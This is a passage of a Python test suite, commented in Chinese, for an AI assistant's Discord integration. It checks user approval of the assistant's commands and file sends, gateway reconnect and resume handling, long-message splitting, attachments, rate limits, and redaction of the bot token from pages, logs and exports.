        assert s.fake.callback_of(press) == {"id": press["d"]["id"], "token": press["d"]["token"], "type": 6}
    s.hub.router.flush()
    assert s.session().waiting is not None and s.fake.edits == []
    assert not (s.config.workspace / "pressed.txt").exists()

    s.fake.press(ask)
    s.wait_reply(start, "做完了")
    assert (s.config.workspace / "pressed.txt").exists()
    s.idle()


def test_answering_with_words_instead_of_buttons(bot):
    s = bot(run("toolu_a", "echo a"), run("toolu_b", "echo b"), run("toolu_c", "echo c"), reply(text("三件事都处理完了")))
    start = s.say("做三件事")
    first = s.asked(start)
    s.say("允许")
    second = s.asked(s.fake.sent.index(first) + 1)
    s.say("Vale.")  # 西班牙语也认；不分大小写，标点去掉
    third = s.asked(s.fake.sent.index(second) + 1)
    s.say("no")
    s.wait_reply(start, "三件事都处理完了")

    assert [ending(s.fake.edit_of(ask)) for ask in (first, second, third)] == ["**已允许**", "**已允许**", "**已拒绝**"]
    assert [result_text(tool_results(request)[0]).strip() for request in s.api.requests[1:3]] == ["a", "b"]
    assert result_text(tool_results(s.api.requests[3])[0]).startswith("用户拒绝了这个操作")
    assert s.fake.callbacks == []  # 回的是文字，没有交互要回应
    s.idle()


def test_a_word_sent_before_the_confirmation_arrives_does_not_approve_it(bot, monkeypatch):
    s = bot(
        reply(text("我先看看。"), tool_use("toolu_1", "run_command", {"command": "touch approved.txt"}), stop_reason="tool_use"),
        reply(text("没有执行")),
        reply(text("嗯")),
    )
    channel = s.channel()
    original = channel.ask
    arrive = threading.Event()

    def slow_ask(chat, prompt):
        arrive.wait(10)  # 网络慢、或者正被 Discord 限流：确认请求晚一点才到手机上
        return original(chat, prompt)

    monkeypatch.setattr(channel, "ask", slow_ask)
    start = s.say("看看")
    s.wait_reply(start, "我先看看")
    until(lambda: s.session().waiting is not None, what="确认请求登记好")
    s.say("好")  # 回的是"我先看看。"这一句，这时手机上还没有确认请求
    until(lambda: s.session().queued() == 1, what="这一句排在了这一轮后面")  # 没有被当作答复
    arrive.set()
    ask = s.asked(start)
    s.hub.router.flush()
    assert not (s.config.workspace / "approved.txt").exists()
    assert s.session().waiting is not None

    s.fake.press(ask, allow=False)
    s.wait_reply(start, "没有执行")
    s.wait_reply(start, "嗯")  # 那个"好"作为一条普通的消息，接着跑了一轮
    s.idle()


def test_the_web_and_the_chat_race_for_the_same_confirmation(bot):
    s = bot(run("toolu_a", "echo a"), run("toolu_b", "echo b"), reply(text("完")))
    start = s.say("做两件事")
    first = s.asked(start)
    (pending,) = until(lambda: s.state()["channels"]["approvals"], what="页面上的确认请求")

    # 先在网页上点了允许：聊天里的那条消息改成"已在网页上允许"，再点聊天里的按钮就不算数了
    answer = {"platform": "discord", "chat": OWNER_CHAT, "confirm_id": pending["id"], "allow": True}
    assert s.browser.post("/api/channel/confirm", answer) == (200, {"ok": True})
    assert ending(s.fake.edit_of(first)) == "**已在网页上允许**"
    late = s.fake.callback_of(s.fake.press(first))
    assert late["type"] == 4 and late["data"] == {"content": "这个确认请求已经处理过了", "flags": 64}  # 只有点按钮的人看得到
    status, body = s.browser.post("/api/channel/confirm", answer)
    assert status == 409 and "已经处理过了" in body["error"]

    # 两边同时点：只有一边算数，另一边被告知"已经处理过了"
    second = s.asked(s.fake.sent.index(first) + 1)
    confirm_id = int(s.fake.buttons(second)[0]["custom_id"].removeprefix("ok:"))
    web_result = []
    racer = threading.Thread(target=lambda: web_result.append(s.browser.post("/api/channel/confirm", {**answer, "confirm_id": confirm_id})))
    racer.start()
    pressed = s.fake.press(second)
    racer.join(10)
    chat_won = s.fake.callback_of(pressed)["type"] == 6
    web_won = web_result[0][0] == 200
    assert web_won != chat_won
    assert ending(s.fake.edit_of(second)) == ("**已在网页上允许**" if web_won else "**已允许**")
    s.wait_reply(start, "完")
    assert len(s.api.requests) == 3  # 每条命令只执行了一次
    s.idle()


def test_a_very_long_command_is_shown_in_full_with_the_buttons_last(bot):
    command = "\n".join(f"echo line-{n:04d} " + "x" * 60 for n in range(120))
    s = bot(run("toolu_1", command), reply(text("都打印出来了")))
    start = s.say("打印很多行")
    ask = s.asked(start)
    pieces = s.fake.sent[start : s.fake.sent.index(ask) + 1]
    assert len(pieces) >= 4 and all(not s.fake.buttons(piece) for piece in pieces[:-1])
    assert pieces[0]["plain"].startswith("**助手想要执行命令：**") and pieces[-1]["plain"].endswith(f"工作目录：{s.config.workspace}")
    assert all(utf16(piece["plain"]) <= 2000 and fences_balanced(piece["plain"]) for piece in pieces)
    shown = "\n".join(piece["plain"] for piece in pieces)
    assert all(f"echo line-{n:04d} " + "x" * 60 in shown for n in range(120))
    s.fake.press(ask)
    s.wait_reply(start, "都打印出来了")
    assert ending(s.fake.edit_of(ask)) == "**已允许**"
    s.idle()


# ---- 断线、重连 ------------------------------------------------------------------


def test_a_reconnect_request_resumes_and_replays_what_was_missed(bot, pause):
    s = bot(reply(text("断线时发的那条，收到了")))
    until(lambda: s.fake.heartbeats >= 1, what="心跳")
    s.fake.reconnect()  # op 7：Discord 要换一台服务器了，请你重连
    assert pause.entered.wait(5)
    assert s.channel().status.state == "connecting"
    until(lambda: s.fake.closes, what="旧连接关掉")
    assert s.fake.closes == [gateway.KEEP_SESSION]  # 不是 1000、1001：那两个会让 Discord 把会话作废

    start = len(s.fake.sent)
    missed = s.fake.user_says("断线的时候发的")  # 这时没有连接：Discord 先记着，Resume 以后补发
    pause.go.set()
    s.wait_reply(start, "断线时发的那条，收到了")
    assert len(s.fake.identifies) == 1  # 没有重新登录（一天只许 1000 次）
    (resume,) = s.fake.resumes
    assert resume == {"token": TOKEN, "session_id": "session-1", "seq": missed["s"] - 1}
    assert s.fake.urls[1] == "/resume?v=10&encoding=json"  # Resume 连的是 READY 里给的 resume_gateway_url
    until(lambda: s.channel().status.state == "online", what="又连上了")


def test_a_dropped_connection_resumes(bot, quick):
    s = bot(reply(text("断线以后的回答")))
    until(lambda: s.fake.heartbeats >= 1, what="心跳")
    s.fake.drop()
    until(lambda: s.fake.resumes, what="Resume")
    assert len(s.fake.identifies) == 1  # 没有重新登录
    s.wait_reply(s.say("还在吗"), "断线以后的回答")


def test_a_zombie_connection_is_dropped_and_resumed(bot, pause):
    s = bot(reply(text("醒过来了")))
    until(lambda: s.fake.heartbeats >= 1, what="心跳")
    s.fake.ack = False  # 心跳发出去了，没有回音：连接多半已经断了，只是 TCP 还不知道
    assert pause.entered.wait(5)
    status = s.channel().status
    assert (status.state, status.message) == ("connecting", "心跳没有回应，正在重连")
    until(lambda: s.fake.closes, what="旧连接断开")
    assert s.fake.closes == [None]  # 不打招呼直接断开（没有关闭握手，会话留着，接着 Resume）

    s.fake.ack = True
    pause.go.set()
    until(lambda: s.fake.resumes, what="Resume")
    assert len(s.fake.identifies) == 1
    s.wait_reply(s.say("还在吗"), "醒过来了")


def test_an_invalid_session_that_cannot_resume_logs_in_again(bot, quick):
    s = bot(reply(text("重新登录以后的回答")))
    s.fake.invalid_session(resumable=False)  # op 9，d 为假：这个会话作废了
    until(lambda: len(s.fake.identifies) == 2, what="重新登录")
    assert s.fake.resumes == []
    assert s.fake.urls[-1] == "/gateway/?v=10&encoding=json"  # 重新登录用 /gateway/bot 给的地址，不用 resume_gateway_url
    until(lambda: s.channel().status.state == "online", what="又连上了")
    s.wait_reply(s.say("还在吗"), "重新登录以后的回答")


def test_an_invalid_session_that_can_resume_resumes(bot, quick):
    s = bot(reply(text("接着原来的会话")))
    s.fake.invalid_session(resumable=True)  # op 9，d 为真：还能接着用
    until(lambda: s.fake.resumes, what="Resume")
    assert len(s.fake.identifies) == 1 and s.fake.resumes[0]["session_id"] == "session-1"
    s.wait_reply(s.say("还在吗"), "接着原来的会话")


@pytest.mark.parametrize("code", [4007, 4009])
def test_a_session_discord_will_not_resume_logs_in_again(bot, quick, code):
    s = bot(reply(text("新会话里的回答")))
    s.fake.close(code)  # 4007 序号不对、4009 会话超时：只能重新登录
    until(lambda: len(s.fake.identifies) == 2, what="重新登录")
    assert s.fake.resumes == []
    s.wait_reply(s.say("还在吗"), "新会话里的回答")


@pytest.mark.parametrize(("code", "words"), [(4004, "不认这个 token"), (4014, "intents")])
def test_a_close_that_retrying_cannot_fix_stops_reconnecting(bot, quick, code, words):
    s = bot()
    channel = s.channel()
    s.fake.close(code)
    until(lambda: channel.status.state == "error", what="出错")
    assert words in channel.status.message and TOKEN not in channel.status.message
    channel.join(2)
    assert not channel._thread.is_alive()  # 线程退出了：再连也没用，不再连（Discord 一天只许登录 1000 次，超了会把 token 作废）
    time.sleep(0.2)  # 重连的等待已经换成了几毫秒：要是还会重连，这会儿早就连上了
    assert (s.fake.connections, len(s.fake.identifies), s.fake.resumes) == (1, 1, [])
    until(lambda: s.platform()["status"]["state"] == "error" and words in s.platform()["status"]["message"], what="页面上的状态")


def test_running_out_of_logins_for_today_waits_instead_of_logging_in(bot):
    bot.fake.remaining = 0  # /gateway/bot 说今天的 Identify 次数用完了：再登录会让 token 作废
    s = bot(online=False)
    until(lambda: s.channel() is not None and s.channel().status.state == "error", what="出错")
    assert "今天连接 Discord 的次数用完了，1 分钟以后再连" in s.channel().status.message
    until(lambda: "次数用完了" in s.platform()["status"]["message"], what="页面上的状态")
    time.sleep(0.2)
    assert s.fake.connections == 0 and s.fake.identifies == [] and s.fake.requests.count("GET /gateway/bot") == 1  # 在等，没有一直去问
    began = time.monotonic()
    s.close()  # 正在等的时候退出：马上醒过来
    assert time.monotonic() - began < 3


# ---- 长消息、附件、"正在输入"、限流 ----------------------------------------------------


def test_a_long_reply_arrives_in_pieces_discord_accepts(bot):
    long_reply = "\n\n".join(
        f"#### 第 {n} 部分\n" + "说明文字 😀 " * 30 + "\n```python\n" + "\n".join(f"print({n}, {i})" for i in range(50)) + "\n```" for n in range(12)
    )
    assert utf16(long_reply) > 5 * 2000
    s = bot(reply(text(long_reply)))
    start = s.say("写长一点")
    s.wait_reply(start, "print(11, 49)")
    pieces = s.fake.sent[start:]
    assert len(pieces) >= 5
    for piece in pieces:
        assert utf16(piece["plain"]) <= 2000 and fences_balanced(piece["plain"]), piece["plain"]
    shown = "\n".join(piece["plain"] for piece in pieces)
    assert all(f"**第 {n} 部分**" in shown for n in range(12))
    assert all(f"print({n}, {i})" in shown for n in range(12) for i in range(50))
    s.idle()


def test_a_photo_reaches_the_model_as_an_image(bot):
    s = bot(reply(text("是一张很小的图")))
    start = s.say("这是什么", attachments=[("cat.jpg", "image/jpeg", JPEG_BYTES)])
    s.wait_reply(start, "是一张很小的图")
    content = s.api.requests[0]["messages"][-1]["content"]
    (image,) = [block for block in content if block["type"] == "image"]
    assert image["source"] == {"type": "base64", "media_type": "image/jpeg", "data": base64.b64encode(JPEG_BYTES).decode()}
    assert any(block["type"] == "text" and block["text"] == "这是什么" for block in content)
    assert [item["authorization"] for item in s.fake.downloads] == [None]  # 附件的地址是签过名的：下载时不带 token
    s.idle()
    saved = s.app.store.load(s.session().conversation.id)
    (user,) = [event for event in saved.events if event["type"] == "user"]
    assert user["attachments"][0]["name"] == "cat.jpg" and user["attachments"][0]["kind"] == "image"


def test_a_text_file_reaches_the_model_as_text(bot):
    s = bot(reply(text("读完了")))
    start = s.say("帮我看看", attachments=[("notes.txt", "text/plain", "第一行\n第二行 ✓".encode())])
    s.wait_reply(start, "读完了")
    sent = json.dumps(s.api.requests[0]["messages"][-1], ensure_ascii=False)
    assert "第二行 ✓" in sent and "notes.txt" in sent
    s.idle()


def test_things_it_cannot_take_get_an_explanation(bot):
    s = bot()
    huge = ("huge.zip", "application/zip", b"PK\x03\x04", CHANNEL_DOWNLOAD_BYTES + 1)  # Discord 说它有 20 MB 多
    s.wait_reply(s.say("看看这个", attachments=[huge]), f"这个文件太大了，最多 {CHANNEL_DOWNLOAD_BYTES // 1_000_000} MB")
    s.wait_reply(s.say("", extra={"sticker_items": [{"id": "1", "name": "wave", "format_type": 1}]}), "还处理不了贴纸")
    s.wait_reply(s.say("", attachments=[("data.bin", "application/octet-stream", b"\x00\x01\x02binary")]), "这个文件用不了")
    s.idle()
    assert s.api.requests == []
    assert [item["key"].rsplit("/", 1)[-1] for item in s.fake.downloads] == ["data.bin"]  # 太大的那个根本没有去下载


def test_a_rate_limited_reply_still_arrives(bot):
    s = bot(reply(text("慢慢来")))
    s.fake.fail_next[MESSAGES] = (429, {"message": "You are being rate limited.", "retry_after": 0.05, "global": False})
    s.wait_reply(s.say("你好"), "慢慢来")
    assert s.fake.requests.count(MESSAGES) == 2  # 被限流了一次：等了一会儿再发，发出去了
    s.idle()


# ---- 密钥 ------------------------------------------------------------------


def test_connecting_discord_from_the_page(bot):
    s = bot(connected=False)
    platform = s.platform()
    assert (platform["configured"], platform["status"]["state"], platform["token_hint"]) == (False, "off", "")

    def connect(token):
        return s.browser.post("/api/channel/connect", {"platform": "discord", "credentials": {"token": token}})

    # 样子不对：不去问 Discord 就拒绝；Discord 不认的：说清楚
    status, body = connect("nonsense")
    assert status == 409 and "不像是一个 Discord 机器人的 token" in body["error"]
    assert s.fake.requests == []
    status, body = connect(REJECTED)
    assert status == 409 and "不认这个 token" in body["error"] and REJECTED not in body["error"]
    assert not s.config.channels_file.exists()  # 不对的 token 不保存

    status, body = connect(f"  {TOKEN}\n")
    assert status == 200 and body == {"ok": True, "bot": {**s.fake.bot, "handle": "@zhifox_test"}}
    until(lambda: s.platform()["status"]["state"] == "online", what="连上")
    platform = s.platform()
    assert platform["configured"] is True and platform["enabled"] is True and platform["approval"] == "ask"
    assert platform["token_hint"] == "…" + TOKEN[-4:] and platform["hints"] == {"token": "…" + TOKEN[-4:]}
    assert platform["bot"] == {"username": "zhifox_test", "name": "ZhiFox Test", "handle": "@zhifox_test",
                               "link": s.fake.bot["link"], "install": s.fake.bot["install"]}
    assert ChannelStore(s.config.channels_file).credentials("discord") == {"token": TOKEN}  # 存的是去掉空白的
    until(lambda: s.fake.commands, what="登记斜杠命令")  # 用的是检查 token 时问到的应用编号

    # token 只有最后 4 位出现在页面上：发给浏览器的每一个事件里都找不到它（不对的那个也找不到）
    everything = json.dumps(s.browser.events, ensure_ascii=False)
    assert TOKEN not in everything and SECRET_PART not in everything and REJECTED not in everything


def test_the_token_never_reaches_the_logs(bot, caplog):
    caplog.set_level(logging.DEBUG, logger="harness")
    harness_logger = logging.getLogger("harness")
    harness_logger.addHandler(caplog.handler)  # log.setup 关掉过往上传的话，caplog 照样收得到
    try:
        s = bot()
        until(lambda: s.fake.commands, what="登记斜杠命令")
        # Discord 的说明里带着 token：发送失败记进日志时，已经换成了 <hidden>
        s.fake.fail_next[MESSAGES] = (400, {"code": 50035, "message": f"Invalid Form Body (Authorization: Bot {TOKEN})"})
        s.say("/help")
        until(lambda: "发送失败" in caplog.text, what="日志里记下发送失败")
        s.fake.fail_next[f"PUT /applications/{APP_ID}/commands"] = (401, {"message": f"401: Unauthorized {TOKEN}", "code": 0})
        s.hub.relabel()  # 换了界面语言：重新登记命令，这次失败了
        until(lambda: "没能登记斜杠命令" in caplog.text, what="日志里记下登记失败")
        s.fake.close(4004)
        until(lambda: any(record.levelno == logging.WARNING and "不认这个 token" in record.getMessage() for record in caplog.records), what="日志里记下出错")
    finally:
        harness_logger.removeHandler(caplog.handler)
    assert "<hidden>" in caplog.text
    assert TOKEN not in caplog.text and SECRET_PART not in caplog.text


def test_an_export_leaves_out_the_discord_token(tmp_path):
    data = tmp_path / "data"
    store = ChannelStore(data / "channels.json")
    store.connect("discord", {"token": TOKEN}, FakeDiscord().bot)
    store.remember_chat("discord", OWNER_CHAT, "20261121-0900-abc")
    out = io.BytesIO()
    work = export.write_archive(data, out, datetime(2026, 11, 21, 9, 0))
    archive = zipfile.ZipFile(io.BytesIO(out.getvalue()))
    assert list(work.masked) == ["channels.json"]
    entry = json.loads(archive.read("channels.json"))["platforms"]["discord"]
    assert entry["credentials"] == {"token": export.PLACEHOLDER}
    # 别的设置照样留着，恢复以后只要重新填 token
    assert entry["bot"]["username"] == "zhifox_test" and entry["bot"]["app"] == APP_ID
    assert entry["chats"][OWNER_CHAT]["conversation"] == "20261121-0900-abc"
    everything = b"".join(archive.read(name) for name in archive.namelist())
    assert TOKEN.encode() not in everything and SECRET_PART.encode() not in everything
    assert ChannelStore(data / "channels.json").credentials("discord") == {"token": TOKEN}  # 导出不改原来的文件


# ---- 发文件（send_file）--------------------------------------------------------------


def outgoing(name: str = "屏幕.png", data: bytes = PNG_BYTES, media_type: str = "image/png", kind: str = "photo", caption: str = "") -> OutboundFile:
    return OutboundFile(name, data, media_type, kind, caption)


def test_a_file_goes_as_an_attachment_with_its_caption(fake):
    channel = client(fake)
    channel.send_file(OWNER_CHAT, outgoing(caption="**现在**的屏幕\n#### 小标题"))
    channel.send_file(OWNER_CHAT, outgoing("report.pdf", PDF_BYTES, "application/octet-stream", "document"))
    photo, document = fake.uploads
    assert (photo["chat"], photo["filename"], photo["content_type"], photo["data"]) == (OWNER_CHAT, "屏幕.png", "image/png", PNG_BYTES)
    assert photo["content"] == markup.to_discord("**现在**的屏幕\n#### 小标题") == "**现在**的屏幕\n**小标题**"  # 排成 Discord 的样子
    assert (document["filename"], document["data"], document["content"]) == ("report.pdf", PDF_BYTES, "")
    assert fake.sent == []  # 说明和文件在同一条消息里，没有另发
    assert fake.requests.count(MESSAGES) == 2  # 和普通的消息是同一个接口（假 Discord 照样查了 token 和 User-Agent）


def test_a_long_caption_follows_the_file(fake):
    channel = client(fake)
    caption = "很长的说明。" * 400  # 2400 个字：放不进一条消息
    channel.send_file(OWNER_CHAT, outgoing(caption=caption))
    (upload,) = fake.uploads
    assert upload["content"] == ""
    assert len(fake.sent) == 2 and "".join(message["content"] for message in fake.sent) == caption
    assert [kind for kind, _ in fake.timeline] == ["upload", "message", "message"]  # 先文件，再说明


def test_a_file_discord_says_is_too_big(fake):
    channel = client(fake)
    fake.file_limit = 100  # 真的是 20 MiB：测试里不用真的传那么多
    with pytest.raises(DiscordError, match="这个文件太大了，Discord 不让机器人发这么大的文件") as caught:
        channel.send_file(OWNER_CHAT, outgoing("big.pdf", b"%PDF" + b"0" * 200, "application/octet-stream", "document"))
    assert (caught.value.status, caught.value.code) == (413, 40005)
    assert fake.uploads == []


def test_upload_errors_never_contain_the_token_and_a_rate_limit_is_waited_out(fake):
    channel = client(fake)
    fake.fail_next[MESSAGES] = (400, {"code": 50035, "message": f"Invalid Form Body: Authorization: Bot {TOKEN}"})
    with pytest.raises(DiscordError) as caught:
        channel.send_file(OWNER_CHAT, outgoing())
    assert TOKEN not in str(caught.value) and SECRET_PART not in str(caught.value) and "<hidden>" in str(caught.value)
    nowhere = DiscordChannel(TOKEN, "http://127.0.0.1:9/api/v10")  # 没有人在听的端口
    with pytest.raises(DiscordError, match="连不上 Discord") as caught:
        nowhere.send_file(OWNER_CHAT, outgoing())
    assert TOKEN not in str(caught.value)

    fake.fail_next[MESSAGES] = (429, {"message": "You are being rate limited.", "retry_after": 0.05, "global": False})
    channel.send_file(OWNER_CHAT, outgoing())
    assert len(fake.uploads) == 1 and fake.requests.count(MESSAGES) == 3  # 第一次出错；被限流了一次，等一会儿再传，传上了


def test_discords_upload_limits_follow_its_documentation():
    uploads = DiscordChannel.capabilities.uploads
    assert uploads is not None and uploads.file_bytes == uploads.photo_bytes <= 20 * 1024 * 1024 and uploads.caption_chars == 2000


def test_a_screenshot_is_approved_in_the_chat_and_arrives_as_an_attachment(bot):
    s = bot(send("toolu_1", "screen.png", caption="这是**现在**的屏幕", before="截好了。"), reply(text("发过去了，看得到吗？")))
    (s.config.workspace / "screen.png").write_bytes(PNG_BYTES)
    start = s.say("截屏看下你在做啥")
    first = s.wait_reply(start, "截好了")
    ask = s.asked(start)
    # 确认请求上写着发到哪里、哪个文件、多大
    assert ask["content"].startswith(f"**助手想要把一个文件发到 Discord（和 {OWNER_NAME} 的私聊）：**")
    assert "文件：screen.png" in ask["content"] and "图片，会直接显示在聊天里" in ask["content"]
    assert s.fake.uploads == []  # 你点之前什么都没发
    s.fake.press(ask)

    upload = s.fake.wait_upload()
    assert (upload["chat"], upload["filename"], upload["data"], upload["content"]) == (OWNER_CHAT, "screen.png", PNG_BYTES, "这是**现在**的屏幕")
    s.wait_reply(start, "看得到吗")
    s.idle()
    assert int(first["id"]) < int(ask["id"]) < int(upload["id"])  # 聊天里的顺序和助手做的一样
    assert s.fake.edit_of(ask)["content"].endswith("**已允许**")
    result = result_of(s.api.requests[1])
    assert not result["error"] and result["text"].startswith("已经把 screen.png（图片，作为照片显示在聊天里，1 KB）发到了 Discord 的聊天里")


def test_with_everything_allowed_a_file_is_sent_without_asking(bot):
    s = bot(send("toolu_1", "report.pdf"), reply(text("发了。")), approval="all")
    (s.config.workspace / "report.pdf").write_bytes(PDF_BYTES)
    start = s.say("把报告发给我")
    s.wait_reply(start, "已自动允许：send_file report.pdf")  # 没问你，但聊天里看得到它做了什么
    assert s.fake.wait_upload()["filename"] == "report.pdf"
    s.wait_reply(start, "发了。")
    s.idle()
    assert not any(s.fake.is_prompt(message) for message in s.fake.sent)
    assert "（文件，" in result_of(s.api.requests[1])["text"]


def test_a_file_too_big_for_discord_is_refused_before_asking(bot):
    s = bot(send("toolu_1", "big.pdf"), reply(text("太大了，我压缩一下。")))
    (s.config.workspace / "big.pdf").write_bytes(PDF_BYTES + b"0" * 5000)
    channel = s.channel()
    channel.capabilities = replace(channel.capabilities, uploads=Uploads(file_bytes=3000, photo_bytes=3000))
    s.wait_reply(s.say("发大文件"), "太大了")
    s.idle()
    assert s.fake.uploads == [] and not any(s.fake.is_prompt(message) for message in s.fake.sent)  # 明知发不了：不弹确认
    result = result_of(s.api.requests[1])
    assert result["error"] and "Discord 最多能发 3 KB" in result["text"]
